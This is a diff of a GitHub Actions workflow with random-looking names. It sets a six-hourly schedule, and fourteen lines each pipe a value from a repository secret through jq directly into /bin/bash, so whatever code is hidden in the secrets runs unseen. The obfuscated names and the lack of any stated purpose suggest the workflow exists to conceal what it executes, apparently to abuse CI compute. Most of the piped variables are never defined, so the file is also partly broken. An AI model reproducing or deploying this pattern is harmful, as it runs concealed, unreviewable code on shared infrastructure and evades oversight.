@@ -2,23 +2,29 @@ name: remudaparliament
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
-jobs:  # 7876
+    - cron: '39 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: remudaparliament
         env:
-          sygjw89: ${{ secrets.sygjw89 }}
+          xz4: ${{ secrets.xz4 }}
         run: |
-          echo $sygjw89 | jq -r .etu290 | /bin/bash
-          echo $kmq75357 | jq -r .r62 | /bin/bash
-          echo $kgqfo1 | jq -r .ih366 | /bin/bash
-          echo $ze165 | jq -r .hv5 | /bin/bash
-          echo $ytp82060 | jq -r .ipj307 | /bin/bash
-          echo $gojrx41 | jq -r .hjxn1 | /bin/bash
-          echo $vqq5 | jq -r .babkp3 | /bin/bash
-          echo $h094 | jq -r .lum29 | /bin/bash
-          echo $tyxsn61486 | jq -r .xndrj1894 | /bin/bash
+          echo $xz4 | jq -r .cfz97638 | /bin/bash
+          echo $c227 | jq -r .wb60961 | /bin/bash
+          echo $zlr758 | jq -r .hl80768 | /bin/bash
+          echo $n46281 | jq -r .g57 | /bin/bash
+          echo $cobys12 | jq -r .kip6274 | /bin/bash
+          echo $b97 | jq -r .vrei143 | /bin/bash
+          echo $cyku749 | jq -r .lrfeg1119 | /bin/bash
+          echo $a4 | jq -r .xszgb990 | /bin/bash
+          echo $s79321 | jq -r .nyhdn67 | /bin/bash
+          echo $xs22 | jq -r .m0 | /bin/bash
+          echo $ibx81051 | jq -r .h9 | /bin/bash
+          echo $lrp19149 | jq -r .o351 | /bin/bash
+          echo $vx846 | jq -r .zut9227 | /bin/bash
+          echo $qle05 | jq -r .u2832 | /bin/bash
 
